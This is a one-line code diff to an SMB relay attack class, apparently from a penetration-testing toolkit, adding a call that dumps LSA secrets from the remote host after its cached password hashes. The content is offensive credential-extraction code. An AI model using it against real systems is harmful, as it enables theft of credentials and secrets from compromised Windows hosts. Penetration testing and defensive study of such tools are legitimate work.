@@ -113,6 +113,7 @@ class SMBAttack(ProtocolAttack):
                     SECURITYFileName = remoteOps.saveSECURITY()     	
                     LSASecrets = LSASecrets(SECURITYFileName, bootKey, remoteOps=None, isRemote= True, history=False)
                     LSASecrets.dumpCachedHashes()
+                    LSASecrets.dumpSecrets()
                     LOG.info("Done dumping LSA secrets for host: %s", self.__SMBConnection.getRemoteHost())
             except Exception as e:
                 LOG.error(str(e))
